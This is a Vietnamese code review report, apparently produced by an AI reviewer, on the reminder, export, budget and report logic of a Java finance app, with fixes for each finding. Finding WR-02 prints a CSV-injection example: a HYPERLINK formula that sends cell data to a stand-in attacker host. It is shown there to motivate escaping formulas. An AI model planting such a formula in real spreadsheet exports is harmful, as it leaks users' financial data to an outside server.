---
phase: 04-nghi-p-v-ph-i-sinh-b-o-c-o
reviewed: 2026-08-28T00:00:00Z
depth: standard
files_reviewed: 98
findings:
  critical: 2
  warning: 6
  info: 5
  total: 13
status: issues_found
---

# Phase 4: Báo cáo rà soát mã nguồn

**Thời điểm rà soát:** 2026-08-28
**Mức độ:** standard
**Số tệp đã đọc:** 98
**Trạng thái:** issues_found

## Tóm tắt

Phase 4 gồm sáu nhóm nghiệp vụ phái sinh (ngân sách, sổ nợ, mục tiêu tiết kiệm, khoản định kỳ,
thông báo, báo cáo/export) cùng sáu tác vụ nền. Chất lượng tổng thể **cao hơn mức trung bình rõ
rệt**: các quy tắc bất biến khó nhất của dự án đều được tuân thủ có ý thức và có Javadoc giải
thích lý do.

Những điểm làm đúng đáng ghi nhận:

- **Ranh giới trigger (§9) được tôn trọng tuyệt đối.** `DebtService` và `GoalService` chỉ chèn/xoá
  bản ghi bảng con rồi đọc lại bằng query trả **scalar** (`findPaidAmountNative`,
  `findSavedAmountNative`) — đúng cách né bẫy Hibernate identity map trả dữ liệu cũ sau khi
  trigger ghi. Javadoc còn ghi lại đúng ca lỗi thật đã gặp.
- **Self-invocation `@Transactional` được xử lý nhất quán.** Bốn bean worker riêng
  (`BudgetRenewalWorker`, `DebtReminderWorker`, `RecurringSinglePeriodWriter`,
  `ExportCleanupWorker`) tồn tại đúng vì lý do proxy AOP, không phải vì thói quen.
- **`@TransactionalEventListener(AFTER_COMMIT)` có `REQUIRES_NEW`** trong `BudgetAlertListener` —
  đúng chỗ hay quên nhất.
- **§2 (loại `transfer`) được tập trung hoá** vào hằng số `ReportQueryFragments.REPORT_ELIGIBLE`,
  hard-code không cho tham số tắt. §1 (cộng gộp danh mục con) đi qua `fn_category_tree` hoặc
  `JOIN ... COALESCE(parent_category_id, id)`, không rải điều kiện thủ công.
- **§6** được giữ nghiêm: `spent_amount` luôn đọc từ `v_budget_progress`, không tính lại ở Java.
- **§10**: mọi số tiền là `Long`; `double` chỉ xuất hiện ở tỉ lệ/nhịp chi, không ở tiền.

Hai vấn đề **critical** đều nằm ở tầng đúng đắn nghiệp vụ chứ không phải bảo mật: một lỗi
logic khiến nhắc nợ quá hạn bỏ sót mốc đầu tiên và có thể sinh thông báo trùng, và một lỗi ranh
giới transaction khiến job export kẹt vĩnh viễn ở trạng thái `processing` khi gặp lỗi CSDL.

---

## Critical Issues

### CR-01: Nhắc nợ quá hạn bỏ sót mốc đầu tiên, không chống trùng, và lệch ngày theo múi giờ

**File:** `src/main/java/com/datn/financeapp/debt/service/DebtReminderWorker.java:26-42`

**Issue:** Điều kiện mốc "quá hạn nhắc lại mỗi 7 ngày" viết là:

```java
} else if (daysUntilDue < 0 && daysUntilDue % 7 == 0) {
```

Ba hỏng hóc chồng nhau trên cùng một method:

**1. Mốc quá hạn đầu tiên bị bỏ sót.** Điều kiện chỉ khớp tại −7, −14, −21, nghĩa là lần nhắc quá
hạn sớm nhất rơi vào **7 ngày sau khi vỡ hạn**. Ngày đến hạn (`daysUntilDue == 0`) và ngày quá hạn
đầu tiên đều im lặng. `api/08` mục 9 mô tả ba mốc là "còn 7 ngày, còn 1 ngày, **quá hạn** nhắc lại
mỗi 7 ngày" — người dùng vỡ hạn hôm qua không nhận được gì suốt một tuần.

**2. Không có cơ chế chống trùng.** `insertGenericNotification` không có `ON CONFLICT` — Javadoc
của nó nói rõ chống trùng "nằm ở tầng service ... chỉ gọi đúng ba mốc ngày cố định". Nhưng đó là
giả định chứ không phải đảm bảo: job chạy hằng ngày, nên chỉ cần chạy lại trong cùng một ngày
(retry sau lỗi, deploy lại, hai instance cùng bật scheduler) là khoản nợ đang ở đúng mốc sẽ sinh
thông báo trùng. So sánh với `insertBudgetAlertIfNotExists` vốn được bảo vệ bằng
`uq_notif_budget_alert` + `ON CONFLICT DO NOTHING` — nhánh nhắc nợ thiếu hẳn lớp này.

**3. `LocalDate.now()` không có múi giờ.** Job khai `zone = "Asia/Ho_Chi_Minh"` nhưng phép tính
bên trong dùng múi giờ mặc định của JVM. Trên môi trường chạy UTC, job 4h sáng giờ VN kích hoạt
lúc 21h **hôm trước** theo UTC, nên `LocalDate.now()` trả về ngày hôm trước và cả ba mốc lệch đúng
một ngày — mốc "ngày mai đến hạn" sẽ bắn khi còn tận 2 ngày. (Xem thêm WR-06, cùng gốc rễ.)

`DebtReminderJobIntegrationTest` hiện chỉ có 4 test và **không ca nào chạm nhánh quá hạn**, nên cả
ba lỗi đều lọt qua CI.

**Fix:** Đưa mốc về đúng đặc tả, neo ngày vào múi giờ VN, và chống trùng bằng CSDL:

```java
private static final ZoneId VN_ZONE = ZoneId.of("Asia/Ho_Chi_Minh");

@Transactional
void evaluateAndNotify(Debt debt) {
    LocalDate today = LocalDate.now(VN_ZONE);
    long daysUntilDue = ChronoUnit.DAYS.between(today, debt.getDueDate());
    String content;
    if (daysUntilDue == 7) {
        content = "Còn 7 ngày đến hạn khoản nợ với " + debt.getCounterpartyName() + ".";
    } else if (daysUntilDue == 1) {
        content = "Ngày mai đến hạn khoản nợ với " + debt.getCounterpartyName() + ".";
    } else if (daysUntilDue <= 0 && (-daysUntilDue) % 7 == 0) {
        // 0 = đúng ngày đến hạn, sau đó nhắc lại mỗi 7 ngày (-7, -14, ...)
        content = "Đã quá hạn khoản nợ với " + debt.getCounterpartyName() + ".";
    } else {
        return;
    }
    notificationRepository.insertDebtReminderIfNotExists(
            debt.getUserId(), "Nhắc nợ đến hạn", content, debt.getId());
}
```

Kèm theo, bổ sung method chống trùng theo ngày dùng lại đúng khuôn của
`insertBudgetAlertIfNotExists` (biểu thức `((created_at AT TIME ZONE 'UTC')::date)` và một unique
index tương ứng cho `type = 'debt_reminder'`), thay cho `insertGenericNotification` trần.

Bổ sung test cho ba ca hiện chưa có: `daysUntilDue = 0`, `daysUntilDue = -7`, và gọi job hai lần
trong cùng một ngày.

---

### CR-02: `ExportAsyncRunner` — `markFailed` bị cuốn theo transaction đã hỏng, job kẹt vĩnh viễn ở `processing`

**File:** `src/main/java/com/datn/financeapp/report/export/ExportAsyncRunner.java:52-72`
và `src/main/java/com/datn/financeapp/report/service/ExportService.java:34-53`

**Issue:** Method mang cả `@Async` lẫn `@Transactional`, và bắt `Exception` **bên trong chính
transaction đó**:

```java
@Async("exportTaskExecutor")
@Transactional
public void runExport(UUID jobId, UUID userId, ExportRequest req) {
    try {
        ...
        exportJobRepository.markCompleted(...);
    } catch (Exception ex) {
        log.error(...);
        exportJobRepository.markFailed(jobId, "...");   // <-- cùng transaction đã hỏng
    }
}
```

**1. `markFailed` không chạy được khi lỗi là lỗi CSDL.** PostgreSQL huỷ nguyên transaction ngay khi
một câu lệnh vi phạm ràng buộc hoặc mất kết nối: mọi câu sau đó bị từ chối với
`current transaction is aborted`. Câu `markFailed` **cũng hỏng**, ném exception mới ra ngoài khối
catch, và bản ghi kẹt ở `status = 'processing'` **mãi mãi** — không có job nào dọn trạng thái này
(`ExportCleanupJob` chỉ quét `status = 'completed'`). Người dùng poll `GET /reports/export/{jobId}`
sẽ thấy "đang xử lý" vô thời hạn, không bao giờ nhận được thông báo lỗi.

Điều đáng nói là **bài học này đã được rút ra ở nơi khác trong cùng phase**:
`RecurringSinglePeriodWriter` có hẳn một khối Javadoc giải thích chính xác cơ chế
`current transaction is aborted` và dùng `REQUIRES_NEW` để né. `ExportAsyncRunner` không áp dụng.

**2. Race giữa `@Async` và transaction của caller.** `ExportService.createJob` mang
`@Transactional` và gọi `exportAsyncRunner.runExport(...)` **trước khi commit**. `@Async` đẩy lời
gọi sang thread khác ngay lập tức, nên thread export có thể chạy trước khi bản ghi `export_jobs`
được commit. Khi đó `markCompleted`/`markFailed` là `UPDATE ... WHERE e.id = :id` sẽ khớp **0
dòng** và trôi qua im lặng — job lại kẹt ở `processing`. Đây là race thật, tần suất phụ thuộc thời
điểm và tải máy.

**Fix:** Hoãn kích hoạt async tới sau commit, và tách việc ghi trạng thái ra transaction riêng:

```java
// ExportService — chỉ kích hoạt SAU khi bản ghi đã thực sự commit
@Transactional
public ExportJobResponse createJob(UUID userId, ExportRequest req) {
    ...
    exportJobRepository.save(job);
    TransactionSynchronizationManager.registerSynchronization(
            new TransactionSynchronization() {
                @Override public void afterCommit() {
                    exportAsyncRunner.runExport(jobId, userId, req);
                }
            });
    return ExportJobResponse.created(jobId);
}
```

```java
// ExportAsyncRunner — KHÔNG @Transactional ở method ngoài. Mỗi lần ghi trạng thái đi qua bean
// riêng với REQUIRES_NEW, để lỗi của phần sinh tệp không kéo đổ việc ghi 'failed'.
@Async("exportTaskExecutor")
public void runExport(UUID jobId, UUID userId, ExportRequest req) {
    try {
        List<TransactionExportRow> rows = exportDataLoader.load(userId, req); // @Transactional(readOnly)
        Path path = CsvReportWriter.write(Path.of(storageDir), jobId, rows);
        exportStatusWriter.markCompleted(jobId, path);   // @Transactional(REQUIRES_NEW)
    } catch (Exception ex) {
        log.error("Xuất báo cáo thất bại cho job {}", jobId, ex);
        exportStatusWriter.markFailed(jobId, ex);        // @Transactional(REQUIRES_NEW)
    }
}
```

Cân nhắc thêm một job dọn các bản ghi `processing` quá cũ (ví dụ trên 1 giờ) để hệ thống tự phục
hồi sau sự cố hoặc restart giữa chừng.

---

## Warnings

### WR-01: `ExportService.download` không kiểm tra trạng thái và sự tồn tại của tệp

**File:** `src/main/java/com/datn/financeapp/report/service/ExportService.java:66-82`

**Issue:** Sau khi kiểm tra hạn, method trả thẳng
`new FileSystemResource(new File(job.getFilePath()))`. Method **không kiểm tra `job.getStatus()`**
và không kiểm tra tệp còn tồn tại. Nếu `filePath` là `null` (job đang `processing` hoặc `failed`),
`new File(null)` ném `NullPointerException` → 500. Nếu `ExportCleanupJob` đã xoá tệp nhưng chưa xoá
xong bản ghi, Spring trả **HTTP 200 với thân rỗng**. Cả hai đều lệch khỏi hợp đồng lỗi của
`api/00`.

**Fix:**

```java
if (!"completed".equals(job.getStatus()) || job.getFilePath() == null) {
    throw new BusinessException("EXPORT_NOT_READY", HttpStatus.CONFLICT.value(),
            "Tệp xuất chưa sẵn sàng.");
}
Path path = Path.of(job.getFilePath());
if (!Files.isRegularFile(path)) {
    throw new BusinessException("EXPORT_LINK_EXPIRED", HttpStatus.GONE.value(),
            "Tệp xuất không còn tồn tại.");
}
return new FileSystemResource(path);
```

---

### WR-02: CSV export chưa vô hiệu hoá công thức — nguy cơ CSV injection khi mở bằng Excel

**File:** `src/main/java/com/datn/financeapp/report/export/CsvReportWriter.java:55-63`

**Issue:** `escape()` xử lý đúng RFC 4180 (dấu phẩy, ngoặc kép, xuống dòng) nhưng **không xử lý ký
tự mở đầu công thức**. Các trường `note`, `categoryName`, `walletName` đều là văn bản tự do do
người dùng nhập. Một ghi chú bắt đầu bằng `=`, `+`, `-`, `@` hoặc tab/CR sẽ được
Excel/LibreOffice/Google Sheets diễn giải là **công thức** khi mở tệp — ví dụ
`=HYPERLINK("http://ke-tan-cong/?d="&A1,"Bấm vào đây")` để rò rỉ dữ liệu sang máy chủ ngoài.

Rủi ro này có thật vì tệp CSV được sinh ra **chính để mở bằng Excel** — dòng 34 ghi BOM UTF-8
đúng cho mục đích đó. Xếp mức warning (không phải critical) vì cần người dùng chủ động mở tệp và
bấm qua cảnh báo macro của Excel.

**Fix:**

```java
private static String escape(String value) {
    if (value == null || value.isEmpty()) {
        return "";
    }
    String safe = value;
    // Vô hiệu hoá công thức: tiền tố nháy đơn khiến bộ xử lý bảng tính coi ô là văn bản.
    char first = safe.charAt(0);
    if (first == '=' || first == '+' || first == '-' || first == '@'
            || first == '\t' || first == '\r') {
        safe = "'" + safe;
    }
    boolean needsQuoting = safe.contains(",") || safe.contains("\"")
            || safe.contains("\n") || safe.contains("\r");
    String escaped = safe.replace("\"", "\"\"");
    return needsQuoting ? "\"" + escaped + "\"" : escaped;
}
```

---

### WR-03: Tầng báo cáo lọc theo `t.user_id`, nhưng `home()` lại cộng ví nhóm — hai phạm vi mâu thuẫn

**File:** `src/main/java/com/datn/financeapp/report/repository/ReportRepository.java` (mọi query),
`src/main/java/com/datn/financeapp/report/service/ReportQueryService.java:66-67, 322-331`

**Issue:** Mọi query báo cáo lọc bằng `t.user_id = :userId` đơn thuần. Nhưng
`ReportQueryService.home()` **lại** tính `sharedTotal` từ ví nhóm:

```sql
SELECT COALESCE(SUM(current_balance), 0) FROM wallets
WHERE group_id IN (SELECT group_id FROM group_members WHERE user_id = ? AND is_active) ...
```

Hai nửa của cùng một màn hình dùng hai phạm vi khác nhau: số dư *có* gộp ví chung, còn thu/chi và
mọi biểu đồ thì *không*.

Hệ quả cụ thể và đo được: `summary()` tính
`openingBalance = closingBalance − totalIncome + totalExpense` (dòng 66-67), trong đó
`closingBalance` lấy từ `currentBalanceForWallets` — vốn cũng chỉ tính ví cá nhân
(`WHERE user_id = ?`). Nên riêng `summary()` thì nhất quán. Nhưng `home()` hiển thị `sharedTotal`
cạnh một `PeriodSummary` không có ví chung, khiến người dùng có ví nhóm thấy số dư và luồng tiền
không khớp nhau.

`BudgetRepository` có Javadoc nói rõ vế `group_id` "thuộc Phase 5", nên phạm vi cá nhân là quyết
định đã chốt. Vấn đề là `home()` đã đi trước một nửa, tạo mâu thuẫn nội tại **ngay trong Phase 4**.

**Fix (chọn một, không để lửng lơ):** hoặc bỏ `sharedTotal` khỏi `home()` cho tới Phase 5 để cả màn
hình cùng phạm vi cá nhân, hoặc bổ sung ngay vế nhóm vào phạm vi báo cáo:

```java
public static final String REPORT_SCOPE =
        "(t.user_id = :userId OR t.wallet_id IN ("
      + "  SELECT w.id FROM wallets w WHERE w.group_id IN ("
      + "    SELECT gm.group_id FROM group_members gm WHERE gm.user_id = :userId AND gm.is_active)))";
```

Dù chọn hướng nào, ghi quyết định vào `api/06-BAO-CAO.md` để code và tài liệu không trôi dạt.

---

### WR-04: `RecurringService.update` không kiểm tra `interval >= 1` (trong khi `create` có)

**File:** `src/main/java/com/datn/financeapp/recurring/service/RecurringService.java:153-155`

**Issue:** `create()` chặn `interval < 1` tường minh (dòng 90-94), nhưng `update()` gán thẳng:

```java
if (req.interval() != null) {
    rec.setInterval(req.interval());
}
```

`ck_rec_interval` ở tầng CSDL sẽ chặn, nhưng lỗi bật lên thành `DataIntegrityViolationException`
→ 500 kèm tên constraint, thay vì `INVALID_INTERVAL` 400 như `create()`. Hai điểm cuối của cùng
một tài nguyên trả hai loại lỗi khác nhau cho cùng một đầu vào sai.

Đáng chú ý hơn: `RecurringPeriodWriter` có hằng số `MAX_PERIODS_PER_RUN = 5000` với Javadoc ghi rõ
đó là bảo hiểm chống vòng lặp vô hạn "nếu dữ liệu lỗi (ví dụ `interval` bị sửa tay thành 0 **lách
được CHECK**)". Endpoint này chính là con đường lách được nhắc tới.

**Fix:** Tách kiểm tra ra helper dùng chung cho cả hai:

```java
private int validateInterval(Integer interval) {
    int value = interval == null ? 1 : interval;
    if (value < 1) {
        throw new BusinessException(
                "INVALID_INTERVAL", HttpStatus.BAD_REQUEST.value(), "Khoảng lặp phải lớn hơn hoặc bằng 1.");
    }
    return value;
}
```

Trong `update()`: `rec.setInterval(validateInterval(req.interval()));`

---

### WR-05: `DebtService.toListItem` đọc `paidAmount`/`status` từ entity thay vì đọc lại — lệch với chính nguyên tắc của lớp

**File:** `src/main/java/com/datn/financeapp/debt/service/DebtService.java:525-560`

**Issue:** `toListItem` đọc `debt.getPaidAmount()` và `debt.getStatus()` **từ entity đang nằm trong
persistence context**. Nó được gọi từ `writeOff`, `update`, `list`, `detail` — tất cả các nhánh đọc
trừ `addPayment`.

Điều này mâu thuẫn với nguyên tắc mà chính lớp này tuyên bố ở Javadoc đầu file: `addPayment` (dòng
232-234) rất cẩn thận đọc lại bằng `findPaidAmountNative`/`findStatusNative` vì bẫy identity map,
còn các nhánh khác thì không. `GoalService.toListItem` (dòng 421-424) **đã làm đúng** — đọc lại
scalar cho mọi nhánh, tạo ra sự bất đối xứng khó giải thích giữa hai module song song.

Ở luồng hiện tại chưa lộ hậu quả (các nhánh này không có trigger chạy xen giữa), nhưng đây đúng là
loại lỗi mà Javadoc đầu lớp cảnh báo: chỉ cần thêm một bước chạm bảng `debts` là toàn bộ nhánh
này âm thầm trả số cũ.

**Fix:** Cho `toListItem` tự đọc hai cột do trigger sở hữu, theo đúng mẫu `GoalService`:

```java
private DebtListItemResponse toListItem(Debt debt, Wallet wallet, int paymentCount) {
    long paidAmount = debtRepository.findPaidAmountNative(debt.getId()).orElse(debt.getPaidAmount());
    String status = debtRepository.findStatusNative(debt.getId()).orElse(debt.getStatus());
    long remaining = debt.getPrincipalAmount() - paidAmount;
    ...
}
```

---

### WR-06: `LocalDate.now()` không có múi giờ trên toàn tầng nghiệp vụ và tác vụ nền

**File:** nhiều tệp — `ReportQueryService.java:210, 437`, `ExportAsyncRunner.java:106`,
`BudgetService.java:346, 476, 505`, `DebtService.java:100, 199, 415`, `GoalService.java:101`,
`RecurringPeriodWriter.java:96, 130`, `RecurringRunnerService.java:44`, `DebtReminderWorker.java:27`

**Issue:** Tất cả các job `@Scheduled` khai `zone = "Asia/Ho_Chi_Minh"` rất chỉn chu, nhưng mọi
phép tính ngày bên trong lại gọi `LocalDate.now()` — dùng **múi giờ mặc định của JVM**. Trên môi
trường triển khai chạy UTC (mặc định của phần lớn container Docker), các job 1h/2h/3h/3h30/4h sáng
giờ VN kích hoạt lúc 18h/19h/20h/20h30/21h **hôm trước** theo UTC, nên `LocalDate.now()` trả về
**ngày hôm trước**.

Hệ quả cụ thể:
- `BudgetService.renewExpiredBudgets()` gọi `findAutoRenewExpired(LocalDate.now())` — kỳ ngân sách
  hết hạn hôm nay không được lặp cho tới lần chạy sau, trễ một ngày.
- `RecurringRunnerService` gọi `findDue(LocalDate.now())` — khoản định kỳ đến hạn hôm nay bị bỏ
  qua, giao dịch ghi trễ một ngày.
- `DebtReminderWorker` — cả ba mốc nhắc lệch một ngày (xem CR-01).
- `resolveRange()` ở báo cáo và export — biên "tháng này"/"tuần này" lệch vào ngày đầu và cuối kỳ.

CLAUDE.md backend §7 nhấn mạnh "gom nhóm báo cáo dùng thẳng cột `transactions.date` ... KHÔNG
chuyển đổi múi giờ" — đúng cho *cột đã lưu*, nhưng câu hỏi "hôm nay là ngày nào" vẫn buộc phải neo
vào một múi giờ, và múi giờ đó phải là VN. Hai việc này không mâu thuẫn nhau.

**Fix:** Đặt hằng số dùng chung và thay thế toàn bộ:

```java
// com.datn.financeapp.common.time.AppClock
public final class AppClock {
    public static final ZoneId ZONE = ZoneId.of("Asia/Ho_Chi_Minh");
    private AppClock() {}
    public static LocalDate today() { return LocalDate.now(ZONE); }
    public static YearMonth thisMonth() { return YearMonth.now(ZONE); }
}
```

Cách chắc chắn nhất để không sót về sau: thêm luật ArchUnit hoặc Checkstyle cấm gọi
`LocalDate.now()`/`YearMonth.now()` không tham số trong `src/main/java`. Đặt
`TZ=Asia/Ho_Chi_Minh` ở tầng triển khai là biện pháp bọc lót, không thay thế được việc sửa mã.

---

## Info

### IN-01: N+1 query khi dựng danh sách sổ nợ, mục tiêu và khoản định kỳ

**File:** `src/main/java/com/datn/financeapp/debt/service/DebtService.java:376`,
`GoalService.java:369-372, 420-424`, `RecurringService.java:274-280`

**Issue:** `DebtService.list` gọi `countPayments(debt.getId())` cho từng khoản, và bản thân
`countPayments` là `debtPaymentRepository.findByDebtId(debtId).size()` — nạp **toàn bộ entity** chỉ
để đếm. Tương tự, `GoalService.toListItem` phát sinh 3 query cho mỗi mục tiêu và
`RecurringService.buildListItem` phát sinh 4 query cho mỗi khoản.

Hiệu năng ngoài phạm vi v1, nhưng `findByDebtId().size()` thay cho một câu `COUNT` là lãng phí
không cần thiết và sửa rất nhanh.

**Fix:** Thêm `long countByDebtId(UUID debtId)` vào `DebtPaymentRepository` và dùng nó. Về dài
hạn, gom bằng một truy vấn `GROUP BY` duy nhất rồi tra qua `Map`.

---

### IN-02: `BudgetService.summary` giả định mọi ngân sách cùng một loại kỳ

**File:** `src/main/java/com/datn/financeapp/budget/service/BudgetService.java:116`

**Issue:** `rows.isEmpty() ? null : toPeriod(rows.get(0))` lấy kỳ của ngân sách **mới nhất** làm
đại diện cho toàn bộ. Javadoc thừa nhận điều này ("người dùng thường đặt cùng một loại kỳ"). Với
người dùng trộn ngân sách tuần và tháng, `totalLimit`/`totalSpent` cộng gộp qua các kỳ dài ngắn
khác nhau và nhãn kỳ hiển thị sai cho phần lớn số đó.

**Fix:** Chỉ trả `period` khi mọi dòng cùng `periodType` (ngược lại trả `null`), hoặc nhóm kết quả
theo `period_type`. Nếu giữ nguyên, ghi giới hạn này vào `api/05-NGAN-SACH.md`.

---

### IN-03: Nhãn so sánh kỳ trước hiển thị "Tăng 0.0%" khi không đổi

**File:** `src/main/java/com/datn/financeapp/report/service/ReportQueryService.java:94-100`

**Issue:** `buildComparisonLabel` chọn hướng bằng `changeRatio < 0 ? "Giảm" : "Tăng"`, nên
`changeRatio == 0` (chi tiêu y hệt kỳ trước) hiển thị **"Tăng 0.0% so với kỳ trước"** — vừa sai
nghĩa vừa trông như lỗi.

**Fix:**

```java
if (changeRatio == 0) {
    return "Không đổi so với kỳ trước";
}
```

---

### IN-04: Câu đánh giá nhịp chi sai nghĩa ở ca bằng nhau và ca không có dữ liệu

**File:** `src/main/java/com/datn/financeapp/report/service/ReportQueryService.java:238-248`

**Issue:** Hai ca biên cho ra câu vô nghĩa:
- Khi `ratioVsAverage == 1` (chi đúng bằng trung bình), câu thành "chi **nhiều hơn 0%** so với
  trung bình" thay vì "ngang bằng".
- Khi `avgSamePoint == 0` (chưa có dữ liệu 3 tháng trước), `ratioVsAverage` bị đặt bằng 0 và câu
  thành "chi **ít hơn 100%** so với trung bình" — trong khi thực chất là *chưa có gì để so sánh*.

**Fix:** Tách ca `avgSamePoint == 0` ra thông điệp riêng ("Chưa đủ dữ liệu 3 tháng trước để so
sánh") và thêm nhánh bằng nhau — giống cách `buildComparisonLabel` đã xử lý `changeRatio == null`.

---

### IN-05: `childrenDetail` luôn trả `transaction_count = 0`

**File:** `src/main/java/com/datn/financeapp/report/service/ReportQueryService.java:180`

**Issue:** Query `ReportRepository.childrenDetail` **có** chọn `COUNT(*) AS transaction_count`,
nhưng projection nhận kết quả là `CategoryAmountProjection` (chỉ có `getCategoryId`, `getName`,
`getAmount`), và tầng service truyền hằng số `0L` vào trường tương ứng của `ChildDetail`. Cột đếm
được CSDL tính rồi vứt đi, API luôn trả 0.

**Fix:** Thêm `Long getTransactionCount();` vào `CategoryAmountProjection` (hoặc dùng projection
riêng) rồi truyền `orZero(c.getTransactionCount())` thay cho `0L`.

---

_Rà soát: 2026-08-28_
_Người rà soát: Claude (gsd-code-reviewer)_
_Mức độ: standard_
